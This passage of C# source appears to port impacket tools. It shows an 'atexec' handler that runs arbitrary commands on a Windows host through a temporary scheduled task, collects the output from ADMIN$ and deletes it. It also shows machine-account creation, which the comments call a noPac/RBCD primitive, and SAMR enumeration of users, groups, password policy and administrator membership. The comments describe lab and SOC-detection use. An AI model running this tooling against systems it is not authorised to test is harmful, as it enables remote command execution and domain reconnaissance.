            Console.Error.WriteLine("usage: atexec <host> <user> <password> <command> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string command = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        string tmpName = new string(Enumerable.Range(0, 8)
            .Select(_ => "abcdefghijklmnopqrstuvwxyz"[Random.Shared.Next(26)]).ToArray());
        string tmpFile = tmpName + ".tmp";
        string taskPath = "\\" + tmpName;
        string xml = Tsch.BuildTaskXml("cmd.exe", $@"/C {command} > %windir%\Temp\{tmpFile} 2>&1");

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe;
        try
        {
            pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Tsch.Pipe);
            pipe.Bind(DcerpcInterface.Tsch);
        }
        catch (Exception ex) when (ex is IOException or InvalidOperationException)
        {
            Console.Error.WriteLine($"[-] Could not reach the Task Scheduler (\\{DcerpcInterface.Tsch.Pipe}): {ex.Message}");
            Console.Error.WriteLine("    This target does not expose MS-TSCH (expected on Samba); atexec needs a Windows host.");
            return 1;
        }

        Console.WriteLine($"atexec on {host}: registering task {taskPath} to run: {command}");
        uint rc = Tsch.RegisterTask(pipe, taskPath, xml);
        if (rc != 0)
        {
            Console.Error.WriteLine($"[-] SchRpcRegisterTask failed: 0x{rc:x8}");
            return 1;
        }

        try
        {
            Tsch.Run(pipe, taskPath);
            Console.WriteLine($"[+] Task started; waiting for it to run...");
            for (int i = 0; i < 10; i++)
            {
                System.Threading.Thread.Sleep(1000);
                if (Tsch.GetLastRunInfo(pipe, taskPath).HasRun)
                {
                    break;
                }
            }
        }
        finally
        {
            Tsch.Delete(pipe, taskPath);
            Console.WriteLine($"[+] Task {taskPath} deleted.");
        }

        // Read the command output from ADMIN$\Temp over SMB, then remove it.
        try
        {
            Smb2TreeConnectResult admin = client.TreeConnect($@"\\{host}\ADMIN$");
            byte[] output = client.ReadFile(admin.TreeId, $@"Temp\{tmpFile}");
            Console.WriteLine("---- output ----");
            Console.Write(System.Text.Encoding.UTF8.GetString(output));
            Console.WriteLine("----------------");
            client.Create(admin.TreeId, $@"Temp\{tmpFile}", Smb2AccessMask.Delete,
                Smb2CreateDisposition.Open, Smb2CreateOptions.DeleteOnClose);
            client.TreeDisconnect(admin.TreeId);
        }
        catch (IOException ex)
        {
            Console.Error.WriteLine($"[!] Could not read output file: {ex.Message}");
        }

        return 0;
    }

    case "rpc-addcomputer":
    {
        // addcomputer.py (SAMR method): create a machine account via SamrCreateUser2InDomain -
        // the account-creation event a SOC detects (noPac / RBCD primitive). Lab-first and
        // self-cleaning: it creates the (disabled) account, reports the RID, then DELETES it so
        // the DC is left unchanged. The password-set (SamrSetPasswordInternal4New) and enable
        // (SamrSetInformationUser2 UserControl) are deferred (see PORTING_STATUS).
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-addcomputer <host> <user> <password> <computer-name> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string computerName = args[4].EndsWith('$') ? args[4] : args[4] + "$";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, _) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.Error.WriteLine($"Could not resolve account domain '{accountDomain}'.");
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);

        Console.WriteLine($"addcomputer (SAMR) on {host}: creating machine account {computerName} in {accountDomain}");
        SamrCreateUserResult created = Samr.CreateUser2InDomain(
            pipe, dom.Handle, computerName, Samr.UserWorkstationTrustAccount);
        if (!created.Succeeded)
        {
            Console.Error.WriteLine($"[-] SamrCreateUser2InDomain failed: {NtStatus.Describe(created.ReturnCode)}");
            Samr.CloseHandle(pipe, dom.Handle);
            return 1;
        }

        Console.WriteLine($"[+] Created {computerName} — RID {created.Rid} (0x{created.Rid:x}), granted access 0x{created.GrantedAccess:x} (account is disabled until a password is set)");

        // Lab hygiene: remove the account we just created.
        uint delRc = Samr.DeleteUser(pipe, created.Handle);
        Console.WriteLine(delRc == 0
            ? $"[+] Deleted {computerName} again (lab left clean)."
            : $"[!] Could not delete {computerName}: {NtStatus.Describe(delRc)} — remove it manually.");

        Samr.CloseHandle(pipe, dom.Handle);
        return 0;
    }

    case "rpc-enumusers":
    {
        // Domain user enumeration via samr (the samrdump / enumdomusers behavior).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-enumusers <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);

        Console.WriteLine($"SAM on {host} — domains: {string.Join(", ", domains.Entries.Select(d => d.Name))}");

        // The first SAM domain is the account domain (the built-in domain is second).
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is not null)
        {
            SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
            SamrEnumResult users = Samr.EnumerateUsers(pipe, dom.Handle);

            Console.WriteLine($"Users in {accountDomain} ({sid}), {users.Entries.Count}:");
            foreach (SamrRidEntry u in users.Entries)
            {
                SamrHandleResult uh = Samr.OpenUser(pipe, dom.Handle, u.Rid);
                if (uh.Success)
                {
                    SamrUserGeneral info = Samr.QueryUserGeneralInfo(pipe, uh.Handle);
                    string full = string.IsNullOrEmpty(info.FullName) ? "" : $" ({info.FullName})";
                    Console.WriteLine($"  RID {u.Rid,-6} {u.Name}{full}  primaryGroup={info.PrimaryGroupId}");
                    Samr.CloseHandle(pipe, uh.Handle);
                }
                else
                {
                    Console.WriteLine($"  RID {u.Rid,-6} {u.Name}");
                }
            }

            Samr.CloseHandle(pipe, dom.Handle);
        }
        else
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
        }

        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-dispinfo":
    {
        // Domain user display enumeration via samr SamrQueryDisplayInformation level 1
        // (the samrdump display path): RID + account-control flags + name/description/full name
        // for every user in a single enumeration, no per-user OpenUser round-trips.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-dispinfo <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.Error.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
        IReadOnlyList<SamrDisplayUser> users = Samr.QueryDisplayUsers(pipe, dom.Handle);
        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Display info for {accountDomain} ({sid}) on {host} — {users.Count} users:");
        foreach (SamrDisplayUser u in users)
        {
            string full = string.IsNullOrEmpty(u.FullName) ? string.Empty : $" \"{u.FullName}\"";
            Console.WriteLine($"  [{u.Index}] RID {u.Rid,-6} {u.AccountName}{full}");
            if (!string.IsNullOrEmpty(u.AdminComment))
            {
                Console.WriteLine($"          desc: {u.AdminComment}");
            }
            Console.WriteLine($"          flags: {u.AccountControlText}");
        }

        return 0;
    }

    case "rpc-dispgroups":
    {
        // Domain group display enumeration via samr SamrQueryDisplayInformation level 3
        // (DomainDisplayGroup): RID + SE_GROUP_* attributes + name/description for every group.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-dispgroups <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.Error.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
        IReadOnlyList<SamrDisplayGroup> groups = Samr.QueryDisplayGroups(pipe, dom.Handle);
        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Display groups for {accountDomain} ({sid}) on {host} — {groups.Count} groups:");
        foreach (SamrDisplayGroup g in groups)
        {
            Console.WriteLine($"  [{g.Index}] RID {g.Rid,-6} {g.AccountName}");
            if (!string.IsNullOrEmpty(g.AdminComment))
            {
                Console.WriteLine($"          desc: {g.AdminComment}");
            }
            Console.WriteLine($"          attrs: {g.AttributesText}");
        }

        return 0;
    }

    case "rpc-domaininfo":
    {
        // Domain general info via samr SamrQueryInformationDomain level 2 (DomainGeneralInformation):
        // server role/state and live user/group/alias object counts — the quick domain-size recon.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-domaininfo <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.Error.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
        SamrDomainGeneral info = Samr.QueryDomainGeneralInfo(pipe, dom.Handle);
        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        if (!info.Success)
        {
            Console.Error.WriteLine($"QueryInformationDomain(General) failed: 0x{info.Status:X8}");
            return 1;
        }

        Console.WriteLine($"Domain general info for {accountDomain} ({sid}) on {host}:");
        Console.WriteLine($"  DomainName:   {info.DomainName}");
        Console.WriteLine($"  ServerRole:   {info.ServerRoleText}");
        Console.WriteLine($"  ServerState:  {info.ServerStateText}");
        Console.WriteLine($"  UAS-compat:   {info.UasCompatibilityRequired}");
        Console.WriteLine($"  Users:        {info.UserCount}");
        Console.WriteLine($"  Groups:       {info.GroupCount}");
        Console.WriteLine($"  Aliases:      {info.AliasCount}");
        if (!string.IsNullOrEmpty(info.OemInformation))
        {
            Console.WriteLine($"  OemInfo:      {info.OemInformation}");
        }

        return 0;
    }

    case "rpc-aliasmem":
    {
        // Alias (local group) membership via samr SamrOpenAlias (opnum 27) + SamrGetMembersInAlias
        // (opnum 33), against the BUILTIN domain where the well-known aliases live. Resolves the
        // member SIDs to names via lsat. Defaults to Administrators (RID 544).
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-aliasmem <host> <user> <password> [alias-name|rid] [domain] [port]");
            Console.Error.WriteLine("  e.g. rpc-aliasmem 127.0.0.1 Administrator 'pass' Administrators LAB");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string aliasArg = args.Length >= 5 ? args[4] : "Administrators";
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        // Open the BUILTIN domain (S-1-5-32) directly — that's where the well-known aliases live.
        var builtinSid = new SamrSid(1, new byte[] { 0, 0, 0, 0, 0, 5 }, new uint[] { 32 });
        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, builtinSid);

        // Resolve the alias argument (name or RID) to a RID via the BUILTIN alias list.
        SamrEnumResult aliases = Samr.EnumerateAliases(pipe, dom.Handle);
        uint rid;
        if (!uint.TryParse(aliasArg, out rid))
        {
            SamrRidEntry? match = aliases.Entries.FirstOrDefault(
                a => string.Equals(a.Name, aliasArg, StringComparison.OrdinalIgnoreCase));
            if (match is null)
            {
                Console.Error.WriteLine($"Alias '{aliasArg}' not found in BUILTIN. Available: {string.Join(", ", aliases.Entries.Select(a => a.Name))}");
                Samr.CloseHandle(pipe, dom.Handle);
                Samr.CloseHandle(pipe, server.Handle);
                pipe.Close();
                client.TreeDisconnect(ipc.TreeId);
                return 1;
            }
            rid = match.Rid;
        }

        string aliasName = aliases.Entries.FirstOrDefault(a => a.Rid == rid)?.Name ?? aliasArg;

        SamrHandleResult alias = Samr.OpenAlias(pipe, dom.Handle, rid);
        if (!alias.Success)
        {
            Console.Error.WriteLine($"OpenAlias(RID {rid}) failed: 0x{alias.ReturnCode:X8}");
            Samr.CloseHandle(pipe, dom.Handle);
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        (IReadOnlyList<SamrSid> members, uint status) = Samr.GetMembersInAlias(pipe, alias.Handle);
        Samr.CloseHandle(pipe, alias.Handle);
        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();

        if (status != 0)
        {
            Console.Error.WriteLine($"GetMembersInAlias failed: 0x{status:X8}");
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        // Resolve the member SIDs to domain\name via lsat on a fresh lsarpc pipe.
        var names = new Dictionary<string, string>();
        if (members.Count > 0)
        {
            DcerpcPipe lsa = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Lsarpc.Pipe);
            lsa.Bind(DcerpcInterface.Lsarpc);
            ScHandleResult policy = Lsarpc.OpenPolicy2(lsa);
            if (policy.Success)
            {
                var sidStrings = members.Select(m => m.ToString()).ToList();
                foreach (LsaResolvedSid resolved in Lsat.LookupSids(lsa, policy.Handle, sidStrings))
                {
                    string label = string.IsNullOrEmpty(resolved.Domain)
                        ? resolved.Name
                        : $"{resolved.Domain}\\{resolved.Name}";
                    if (!string.IsNullOrEmpty(label))
                    {
                        names[resolved.InputSid] = label;
                    }
                }
                Lsarpc.Close(lsa, policy.Handle);
            }
            lsa.Close();
        }

        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"BUILTIN\\{aliasName} (RID {rid}) on {host} — {members.Count} members:");
        foreach (SamrSid m in members)
        {
            string sid = m.ToString();
            string label = names.TryGetValue(sid, out string? n) ? $"  {n}" : string.Empty;
            Console.WriteLine($"  {sid}{label}");
        }

        return 0;
    }

    case "rpc-samrdump":
    {
        // Faithful port of impacket examples/samrdump.py: the full SAMR recon dump in one run —
        // connect, open the account domain, then print the domain's general info, password/lockout
        // policy, every user (display info) and every group. Chains the already-validated SAMR
        // calls into the single labelled sequence a SOC wants for behavioral detection.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-samrdump <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        static string Days(double? d) => d is null ? "none" : $"{d.Value:0.##} days";

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;

        Console.WriteLine($"=== SAMR dump of {host} ===");
        Console.WriteLine($"SAM domains: {string.Join(", ", domains.Entries.Select(d => d.Name))}");
        Console.WriteLine();

        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.Error.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);

        // --- domain general info ---
        SamrDomainGeneral gi = Samr.QueryDomainGeneralInfo(pipe, dom.Handle);
        Console.WriteLine($"Domain: {accountDomain}  ({sid})");
        if (gi.Success)
        {
            Console.WriteLine($"  Role: {gi.ServerRoleText}   Users: {gi.UserCount}  Groups: {gi.GroupCount}  Aliases: {gi.AliasCount}");
            if (!string.IsNullOrEmpty(gi.OemInformation))
            {
                Console.WriteLine($"  Server: {gi.OemInformation}");
            }
        }

        // --- password / lockout policy ---
        SamrPasswordPolicy pw = Samr.QueryPasswordPolicy(pipe, dom.Handle);
        SamrLockoutPolicy lk = Samr.QueryLockoutPolicy(pipe, dom.Handle);
        bool complex = (pw.PasswordProperties & 0x1) != 0;
        Console.WriteLine("  Password policy:");
        Console.WriteLine($"    Min length {pw.MinPasswordLength}, history {pw.PasswordHistoryLength}, complexity {complex}");
        Console.WriteLine($"    Max age {Days(Samr.RelativeTimeToDays(pw.MaxPasswordAge))}, min age {Days(Samr.RelativeTimeToDays(pw.MinPasswordAge))}");
        Console.WriteLine($"    Lockout threshold {(lk.LockoutThreshold == 0 ? "none" : lk.LockoutThreshold.ToString())}, duration {Days(Samr.RelativeTimeToDays(lk.LockoutDuration))}");
        Console.WriteLine();

        // --- users (display info) ---
        IReadOnlyList<SamrDisplayUser> users = Samr.QueryDisplayUsers(pipe, dom.Handle);
        Console.WriteLine($"Users ({users.Count}):");
        foreach (SamrDisplayUser u in users)
        {
            Console.WriteLine($"  RID {u.Rid,-6} {u.AccountName}  [{u.AccountControlText}]");
            if (!string.IsNullOrEmpty(u.AdminComment))
            {
                Console.WriteLine($"         {u.AdminComment}");
            }
        }
        Console.WriteLine();

        // --- groups (display info) ---
        IReadOnlyList<SamrDisplayGroup> groups = Samr.QueryDisplayGroups(pipe, dom.Handle);
        Console.WriteLine($"Groups ({groups.Count}):");
        foreach (SamrDisplayGroup g in groups)
        {
            Console.WriteLine($"  RID {g.Rid,-6} {g.AccountName}");
        }

        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-userinfo":
    {
        // Per-user detail via samr SamrQueryInformationUser2 class 21 (SAMPR_USER_ALL_INFORMATION) —
        // the account record samrdump prints: timestamps, account-control flags, counters.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-userinfo <host> <user> <password> <target-user> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string targetUser = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);

        // Resolve the target name -> RID directly via SamrLookupNamesInDomain (one RPC)
        // instead of walking the whole user enumeration.
        SamrNameMapping resolved = Samr.LookupNames(pipe, dom.Handle, new[] { targetUser })[0];
        if (!resolved.Resolved)
        {
            Console.WriteLine($"User '{targetUser}' not found in {accountDomain} (SID_NAME_USE={resolved.UseName}).");
            Samr.CloseHandle(pipe, dom.Handle);
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult uh = Samr.OpenUser(pipe, dom.Handle, resolved.Rid);
        SamrUserAll d = Samr.QueryUserAllInfo(pipe, uh.Handle);

        static string Ft(DateTime? t) => t is null ? "(never)" : t.Value.ToString("yyyy-MM-dd HH:mm:ss 'UTC'");

        Console.WriteLine($"User detail for {accountDomain}\\{d.UserName} (RID {d.UserId}):");
        if (!string.IsNullOrEmpty(d.FullName))    Console.WriteLine($"  Full name          : {d.FullName}");
        if (!string.IsNullOrEmpty(d.AdminComment)) Console.WriteLine($"  Description        : {d.AdminComment}");
        Console.WriteLine($"  Primary group RID  : {d.PrimaryGroupId}");
        Console.WriteLine($"  Account control    : 0x{d.UserAccountControl:X8} [{d.AccountFlagsText}]");
        Console.WriteLine($"  Bad password count : {d.BadPasswordCount}");
        Console.WriteLine($"  Logon count        : {d.LogonCount}");
        Console.WriteLine($"  Password last set  : {Ft(Samr.FileTimeToUtc(d.PasswordLastSet))}");
        Console.WriteLine($"  Password must chg  : {Ft(Samr.FileTimeToUtc(d.PasswordMustChange))}");
        Console.WriteLine($"  Last logon         : {Ft(Samr.FileTimeToUtc(d.LastLogon))}");
        Console.WriteLine($"  Account expires    : {Ft(Samr.FileTimeToUtc(d.AccountExpires))}");

        // Group memberships via SamrGetGroupsForUser (opnum 39), with the group RIDs resolved
        // back to names via SamrLookupIdsInDomain (opnum 18) so custom groups show too.
        IReadOnlyList<SamrGroupMembership> groups = Samr.GetGroupsForUser(pipe, uh.Handle);
        Console.WriteLine($"  Group memberships  : {groups.Count}");
        if (groups.Count > 0)
        {
            uint[] groupRids = groups.Select(g => g.Rid).ToArray();
            IReadOnlyList<SamrNameMapping> names = Samr.LookupIds(pipe, dom.Handle, groupRids);
            for (int i = 0; i < groups.Count; i++)
            {
                string label = !string.IsNullOrEmpty(names[i].Name) ? names[i].Name : groups[i].GroupName;
                Console.WriteLine($"    - {label,-32} (RID {groups[i].Rid}, {groups[i].AttributesText})");
            }
        }

        Samr.CloseHandle(pipe, uh.Handle);
        Samr.CloseHandle(pipe, dom.Handle);
        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);
        return 0;
    }

    case "rpc-lookuprid":
    {
        // Name -> RID resolution via samr SamrLookupNamesInDomain (opnum 17): the reverse of
        // rpc-lookupsid, and how name-based tools map accounts to RIDs before opening them.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-lookuprid <host> <user> <password> <names-csv> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string[] targets = args[4].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Samr.Pipe);
        pipe.Bind(DcerpcInterface.Samr);

        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is null)
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
            Samr.CloseHandle(pipe, server.Handle);
            pipe.Close();
            client.TreeDisconnect(ipc.TreeId);
            return 1;
        }

        SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
        IReadOnlyList<SamrNameMapping> rows = Samr.LookupNames(pipe, dom.Handle, targets);

        Console.WriteLine($"Name -> RID in {accountDomain} ({sid}):");
        foreach (SamrNameMapping row in rows)
        {
            Console.WriteLine(row.Resolved
                ? $"  {row.Name,-24} RID {row.Rid,-6} {row.UseName}"
                : $"  {row.Name,-24} (unresolved: {row.UseName})");
        }

        Samr.CloseHandle(pipe, dom.Handle);
